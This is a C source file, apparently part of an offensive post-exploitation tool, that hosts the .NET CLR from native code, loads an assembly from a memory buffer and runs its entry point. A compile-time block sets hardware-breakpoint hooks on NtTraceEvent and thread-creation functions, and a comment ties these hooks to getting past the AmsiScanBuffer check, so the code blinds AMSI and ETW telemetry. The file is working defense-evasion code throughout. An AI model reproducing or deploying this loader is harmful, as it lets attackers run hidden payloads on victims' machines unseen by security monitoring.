#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#include "Structs.h"
#include "SharpStruct.h"
#include "Prototypes.h"

#pragma comment(lib, "MSCorEE.lib")

const wchar_t wClrV2[] = L"v2.0.50727";
const wchar_t wClrV4[] = L"v4.0.30319";

BOOL executeAssembly(
	_In_	PVOID		pAssemblyContent,
	_In_	DWORD		dwAssemblySize,
	_In_	LPWSTR		lpwAssemblyArgs
)
{
	ICLRMetaHost*			pMetaHost		= NULL;
	ICLRRuntimeInfo*		pRuntimeInfo	= NULL;
	IEnumUnknown*			pRuntimeEnum	= NULL;
	ICorRuntimeHost*		pRuntimeHost	= NULL;
	IUnknown*				pAppDomainThunk = NULL;
	AppDomain*				pAppDomain		= NULL;
	Assembly*				pAssembly		= NULL;
	MethodInfo*				pMethodInfo		= NULL;

	HRESULT					hr				= S_OK;
	BOOL					bLoadable		= FALSE;

	VARIANT					retVal			= { 0 };
	VARIANT					obj				= { 0 };

	clrVersion version;

	obj.vt = VT_NULL;

	printf("[*] Assembly Size : %d\n[*] Assembly in memory addr : 0x%p\n\n", dwAssemblySize, pAssemblyContent);


	version = GetVersionOfClr(pAssemblyContent, dwAssemblySize);
	CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)&pMetaHost);

	hr = pMetaHost->lpVtbl->EnumerateLoadedRuntimes((HANDLE)-1, (HANDLE)-1, &pRuntimeEnum);
	if (FAILED(hr)) {
		return FALSE;
	}

	BOOL clrIsLoaded = CheckIfClrIsLoaded(version, pRuntimeEnum, (PVOID*)&pRuntimeInfo);
	if (!
		clrIsLoaded
		)
	{
		printf("[*] CLR is not loaded !\n");

		if (version == CLR_V2)
		{
			hr = pMetaHost->lpVtbl->GetRuntime(pMetaHost, wClrV2, &IID_ICLRRuntimeInfo, (PVOID*)&pRuntimeInfo);
		}
		else
		{
			hr = pMetaHost->lpVtbl->GetRuntime(pMetaHost, wClrV4, &IID_ICLRRuntimeInfo, (PVOID*)&pRuntimeInfo);
		}
		if (FAILED(hr))
			return FALSE;

		hr = pRuntimeInfo->lpVtbl->IsLoadable(pRuntimeInfo, &bLoadable);
		if (FAILED(hr) || !bLoadable)
			return FALSE;
	}

	hr = pRuntimeInfo->lpVtbl->GetInterface(pRuntimeInfo, &CLSID_CorRuntimeHost, &IID_ICorRuntimeHost, (PVOID*)&pRuntimeHost);
	if (FAILED(hr))
		return FALSE;

	hr = pRuntimeHost->lpVtbl->Start(pRuntimeInfo);
	if (FAILED(hr))
		return FALSE;

	hr = pRuntimeHost->lpVtbl->GetDefaultDomain(pRuntimeInfo, &pAppDomainThunk);
	if (FAILED(hr))
		return FALSE;

	hr = pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &xIID_AppDomain, &pAppDomain);
	if (FAILED(hr))
		return FALSE;

	SAFEARRAYBOUND rgsabound[1];
	rgsabound[0].cElements = dwAssemblySize;
	rgsabound[0].lLbound = 0;
	DWORD dwOldProtect = 0;

	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
	if (pSafeArray == NULL)
		return FALSE;

	PVOID pvData = NULL;

	hr = SafeArrayAccessData(pSafeArray, &pvData);
	if (FAILED(hr))
		return FALSE;

	RtlCopyMemory(pvData, pAssemblyContent, dwAssemblySize);

	hr = SafeArrayUnaccessData(pSafeArray);
	if (FAILED(hr))
		return FALSE;

	hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
	if (FAILED(hr))
		return FALSE;

	hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
	if (FAILED(hr))
		return FALSE;

	SAFEARRAY* params = NULL;
	if (lpwAssemblyArgs == NULL)
	{
		params = SafeArrayCreateVector(VT_EMPTY, 0, 0);
	}
	else
	{
		params = prepareArgs(lpwAssemblyArgs);
	}
	 
	if (!params)
		return FALSE;


#ifdef HWBP
	HANDLE hThread		= GetCurrentThread();
	HMODULE hModNtdll	= LoadLibraryA("Ntdll.dll");

	if (!hModNtdll)
		return FALSE;

	DWORD64	dwNtTraceEvent				= GetProcAddress(hModNtdll, "NtTraceEvent");
	DWORD64 dwNtCreateThreadEx			= GetProcAddress(hModNtdll, "NtCreateThreadEx");
	DWORD64 dwNtCreateWorkerFactory		= GetProcAddress(hModNtdll, "NtCreateWorkerFactory");
	DWORD64 dwRtlQueueWorkItem			= GetProcAddress(hModNtdll, "RtlQueueWorkItem");

	if (
		!dwNtTraceEvent				||
		!dwNtCreateThreadEx			||
		!dwNtCreateWorkerFactory	||
		!dwRtlQueueWorkItem
		)
		return FALSE;
	SetHwbp(hThread, dwNtTraceEvent, dwNtCreateWorkerFactory, dwRtlQueueWorkItem, dwNtCreateThreadEx);
	AddVectoredExceptionHandler(1, &HookHandler);

#endif
	/*
	AmsiScanBuffer is call before Invoke_3, the hook in dr0 was change for NtTraceEvent
	*/
	printf("[*] Call Invoke_3\n");

	hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo, obj, params, &retVal);
	if (FAILED(hr))
		return FALSE;

	SafeArrayDestroy(pSafeArray);
	SafeArrayDestroy(params);

	return TRUE;
}